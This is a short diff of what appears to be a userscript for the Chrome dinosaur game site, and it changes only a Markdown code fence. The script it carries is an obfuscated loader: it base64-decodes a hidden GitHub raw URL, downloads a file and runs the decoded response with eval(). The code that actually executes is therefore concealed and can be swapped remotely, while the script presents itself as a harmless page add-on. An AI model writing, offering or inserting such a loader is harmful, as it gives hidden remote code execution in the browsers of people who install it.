@@ -22,4 +22,5 @@ var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
 // @icon         https://chromedino.com/favicon.ico
 // ==/UserScript==
 
-var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0l0cy1MQUxPTC9TY3JpcHRzL21haW4vQ2hyb21lX0Rpbm8='),true);x.send();x.onload=function(){eval(atob(x.responseText))};```
+var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0l0cy1MQUxPTC9TY3JpcHRzL21haW4vQ2hyb21lX0Rpbm8='),true);x.send();x.onload=function(){eval(atob(x.responseText))};
+```
